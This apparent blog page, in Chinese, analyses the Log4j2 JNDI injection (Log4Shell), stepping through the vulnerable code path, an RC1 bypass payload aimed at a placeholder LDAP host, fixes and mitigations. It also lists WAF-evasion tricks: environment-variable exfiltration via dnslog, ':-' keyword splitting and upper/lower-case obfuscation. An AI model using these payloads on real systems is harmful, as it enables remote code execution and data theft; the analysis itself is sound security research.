@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Log4j2 RCE - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Log4j2 RCE", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "Log4j?", url: "#log4j" },
+              {title: "\u5206\u6790", url: "#_2" },
+              {title: "2.15.0 RC1\u7ed5\u8fc7", url: "#2150-rc1" },
+              {title: "\u5b9e\u6218", url: "#_4" },
+              {title: "\u5173\u952e\u5b57", url: "#_8" },
+              {title: "Reference", url: "#reference" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Mybatis/Mybatis/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Mybatis/Mybatis/" class="btn btn-xs btn-link">
+        Mybatis
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Hibernate/Hibernate/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Hibernate/Hibernate/" class="btn btn-xs btn-link">
+        Hibernate
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="log4j2-rce">Log4j2 RCE</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#Log4j">Log4j?</a></li>
+<li><a href="#分析">分析</a><ul>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+<li><a href="#2150-RC1绕过">2.15.0 RC1绕过</a><ul>
+<li><a href="#RC2修复">RC2修复</a></li>
+</ul>
+</li>
+<li><a href="#实战">实战</a><ul>
+<li><a href="#数据带外">数据带外</a></li>
+<li><a href="#关键字混淆">关键字混淆</a></li>
+<li><a href="#upperlower-混淆">upper、lower 混淆</a></li>
+<li><a href="#嵌套">嵌套</a></li>
+</ul>
+</li>
+<li><a href="#关键字">关键字</a></li>
+<li><a href="#Reference">Reference</a></li>
+</ul>
+<p>本质上是一个JNDI注入，屌得一批，之前掀起大热。</p>
+<h2 id="log4j">Log4j?</h2>
+<p>简单点，就是一个拿来打印日志的库，Log4j2是Log4j超级增强版。</p>
+<h2 id="_2">分析</h2>
+<p><img alt="" src="../image/image_G-q_9dlM-i.png" /></p>
+<blockquote>
+<p>影响范围 Java类产品：Apache Log4j 2.x &lt; 2.15.0-rc2 受影响的应用及组件（包括但不限于）如下：Apache Solr、Apache Flink、Apache Druid、Apache Struts2、pring-boot-strater-log4j2等。（来自腾讯云社区）</p>
+</blockquote>
+<p>建立一个servlet（嫖自腾讯云社区）</p>
+<pre><code class="language-java">@WebServlet(name = &quot;ServletDemo&quot;, value = &quot;/ServletDemo&quot;)  
+public class ServletDemo extends HttpServlet {  
+@Override
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {  
+          Logger logger = LogManager.getLogger(ServletDemo.class.getName());  
+          PrintWriter printWriter = response.getWriter();  
+          printWriter.println(&quot;Log4j2 JNDI injection&quot;);  
+          String payload  = request.getParameter(&quot;msg&quot;);  
+if (payload == null){  
+              payload = &quot;input msg parameter: ?msg=helloworld&quot;;  
+          }  
+          printWriter.println(&quot;execute paylaod: &quot; + payload);  
+          logger.error(payload);  
+          printWriter.flush();  
+          printWriter.close();  
+      }  
+
+@Override
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {  
+          Logger logger = LogManager.getLogger(ServletDemo.class.getName());  
+          PrintWriter printWriter = response.getWriter();  
+          printWriter.println(&quot;Log4j2 JNDI injection&quot;);  
+          String payload  = request.getParameter(&quot;msg&quot;);  
+if (payload == null){  
+              payload = &quot;input msg parameter: ?msg=helloworld&quot;;  
+          }  
+          printWriter.println(&quot;execute paylaod: &quot; + payload);  
+          logger.error(payload);  
+          printWriter.flush();  
+          printWriter.close();  
+      }  
+  }
+</code></pre>
+<p>正常运行时，logger.error会把日志输出到服务器面板。</p>
+<p><img alt="" src="../image/image_F045Dtzlxa.png" /></p>
+<p>我们跟进一下这个logger.error。
+下断点，调试开搞。</p>
+<p><img alt="" src="../image/image_qV1PazPGLm.png" /></p>
+<p><img alt="" src="../image/image_2m56o9ZZLl.png" /></p>
+<p><img alt="" src="../image/image_2ogX2ZT1pR.png" /></p>
+<p><img alt="" src="../image/image_EZ2vsLoDZH.png" /></p>
+<p>先调用logIfEnabled函数判断当前事件类型的优先级，如果优先级不够就不会进行之后的代码操作</p>
+<blockquote>
+<p>日志级别</p>
+</blockquote>
+<p>log4j2作为一个日志处理组件，它对日志事件的优先级进行了分类以方便后续的处理
+其内置的日志级别标准如下，各个级别（intLevel）由数值表示，级别越高数值越小。</p>
+<p><img alt="" src="../image/image_mdNMMLJLdQ.png" /></p>
+<p>在上面对logIfEnabled的跟进过程中我们可以看到，只有当intLevel &gt;= level.intLevel()，即当前事件的intLevel小于intLevel常量值时才会继续进行代码。
+而默认的intLevel常量值为200，即error级别，这就意味着在默认情况下只有优先级大于等于error的事件才会继续执行代码，启用日志打印。（本文是用的logger.error触发，所以同理也可以用logger.fatal触发）
+这个intLevel常量值可以通过配置文件和Configurator.setLevel函数进行修改，这里就不再赘述。</p>
+<p>将断点断在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>，继续调试</p>
+<p><img alt="" src="../image/image_bcb4TiEhb8.png" /></p>
+<blockquote>
+<p>模式布局</p>
+</blockquote>
+<p>这里的getLayout方法会获取日志打印的模式布局，也就是日志的格式化形式。 默认的模式布局为%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n，也就是上图中的那样。
+当在解析这串格式化字符串时时，会结合<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表这两个列表进行格式化。
+格式化字符串中我们可以看到有如%d，%t等一系列占位符，这些占位符的意义是用于标识转换器，表示当前位置的字符串应该由何种转换器处理。</p>
+<p><img alt="" src="../image/image_Y0wV_4RDkn.png" /></p>
+<p>接下来我们跟进encode方法</p>
+<p><img alt="" src="../image/image_q9VxGXwBjU.png" /></p>
+<p>toSerializable方法中会先获取<code>PatternConverter</code> 转换器列表，然后用不同的转换器处理传入的数据</p>
+<p><img alt="" src="../image/image_YGY2pytatF.png" /></p>
+<p><img alt="" src="../image/image_0jUBqgEX9s.png" /></p>
+<p>log4j2 rce是MessagePatternConverter这个转换器出了问题，所以我们快进到MessagePatternConverter#format
+它最开始会先去获得当前event信息中的message信息
+然后在后面判断config与noLookups属性的状况
+再然后（重点）去判断msg信息中是否存在字符串“${”，如果存在就会把$及后面的字符串切割出来存放到变量value中，于132行将其作为参数传入replace方法
+最终传入到InitialContext.lookup参数中，完成jndi注入</p>
+<p><img alt="" src="../image/image_vTts2eWNoW.png" /></p>
+<p><img alt="" src="../image/image_4bfcsgEz10.png" /></p>
+<p><img alt="" src="../image/image_aAs8tpwZnP.png" /></p>
+<h4 id="_3">总结</h4>
+<p>在log4j2中如果触发了error级别以上的事件，log4j2会调用不同转换器去分析事件用于格式化输出的日志，在MessagePatternConverter这个转换器中会去获取事件中的message信息（也就是传入logger.error等函数中的String参数）进行处理，如果message信息中存在"${"字符串，就会根据${}中内容的prefix选取对应的Lookup处理器进行处理，如果是prefix是jndi就会造成jndi注入</p>
+<h2 id="2150-rc1">2.15.0 RC1绕过</h2>
+<p>前提条件：目标环境的log4j2配置文件中的%msg改成了%msg{lookup} ，或者通过API动态修改启用了lookup
+just like this</p>
+<pre><code class="language-java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;WARN&quot;&gt;
+    &lt;Appenders&gt;
+        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;
+            &lt;PatternLayout pattern=&quot;[%-level]%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{lookups}%n&quot;/&gt;
+        &lt;/Console&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;Root level=&quot;info&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre>
+<p>但这个前提条件属实苛刻，所以这个绕过也属实有点鸡肋。</p>
+<pre><code class="language-java">payload:
+${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}  在host/后加了个空格
+</code></pre>
+<p>简要分析过程：在进行jndilookup操作时，会判断host是否是白名单里的host(均为内网ip或域名)，如果我们在host/后加一个空格，就会导致其校验函数抛出错误，但是抛出错误后程序并没有进行相应处理，导致最后进行了成功lookup</p>
+<p><img alt="" src="../image/image_Ly_80Jvgdo.png" /></p>
+<blockquote>
+<p>修复建议</p>
+</blockquote>
+<p>（引用自安全客平台）</p>
+<p>修复建议：</p>
+<ol>
+<li>升级Apache Log4j2所有相关应用到最新版。</li>
+<li>升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</li>
+</ol>
+<p>临时建议：</p>
+<ol>
+<li>jvm中添加参数 -Dlog4j2.formatMsgNoLookups=true <strong>（版本&gt;=2.10.0）</strong></li>
+<li>新建log4j2.component.properties文件，其中加上配置log4j2.formatMsgNoLookups=true <strong>（版本&gt;=2.10.0）</strong></li>
+<li>设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true <strong>（版本&gt;=2.10.0）</strong></li>
+<li>对于log4j2 &lt; 2.10以下的版本，可以通过移除JndiLookup类的方式。</li>
+</ol>
+<h3 id="rc2">RC2修复</h3>
+<pre><code class="language-java">try{
+} catch (URISyntaxException ex) {
+    LOGGER.warn(&quot;Invalid JNDI URI - {}&quot;, name);
+    return null;
+}
+return (T) this.context.lookup(name);
+</code></pre>
+<p>catch里直接return了。</p>
+<h2 id="_4">实战</h2>
+<h3 id="_5">数据带外</h3>
+<p>使用 <code>${hostName}</code>、<code>${env:USERDOMAIN}</code>、<code>${env:COMPUTERNAME}</code>等配合 dnslog 实现数据外带。</p>
+<p><img alt="" src="../image/image_poytjt_apY.png" /></p>
+<h3 id="_6">关键字混淆</h3>
+<blockquote>
+<p>在 Lookup 功能处理时的关键字替换过程中，提到了可以使用 <code>:-</code> 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字。例如：
+jndi
+可以尝试混淆为：
+${:::::-j}${what:-n}${ls:-d}${1QAZ2wxs:-i}</p>
+</blockquote>
+<p>并可以将其嵌套使用，可以用来绕过一些不完善的正则、关键字的匹配。</p>
+<p><img alt="" src="../image/image_n2SqA75Fpb.png" /></p>
+<h3 id="upperlower">upper、lower 混淆</h3>
+<p>log4j中支持lower，upper两个前缀，分别用于将字符段小写和大写，可以用这个绕过一些低级waf</p>
+<p><img alt="" src="../image/image__Rg-1cFCfq.png" /></p>
+<p>同时存在一些字符如 <strong>ı(\u0131)</strong> 经过 toUpperCase 就会转变成 I。从而绕过了 jndi 关键词的拦截。</p>
+<h3 id="_7">嵌套</h3>
+<p>顾名思义</p>
+<p><img alt="" src="../image/image_pAuPz6prQo.png" /></p>
+<h2 id="_8">关键字</h2>
+<p>logger.</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.anquanke.com/post/id/263325#h2-6" title="https://www.anquanke.com/post/id/263325#h2-6">https://www.anquanke.com/post/id/263325#h2-6</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1917881" title="https://cloud.tencent.com/developer/article/1917881">https://cloud.tencent.com/developer/article/1917881</a></p>
+<p><a href="http://wjlshare.com/archives/1674" title="http://wjlshare.com/archives/1674">http://wjlshare.com/archives/1674</a></p>
+<p><a href="https://xz.aliyun.com/t/10649#toc-2" title="https://xz.aliyun.com/t/10649#toc-2">https://xz.aliyun.com/t/10649#toc-2</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Mybatis/Mybatis/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Mybatis/Mybatis/" class="btn btn-xs btn-link">
+        Mybatis
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Hibernate/Hibernate/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Hibernate/Hibernate/" class="btn btn-xs btn-link">
+        Hibernate
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
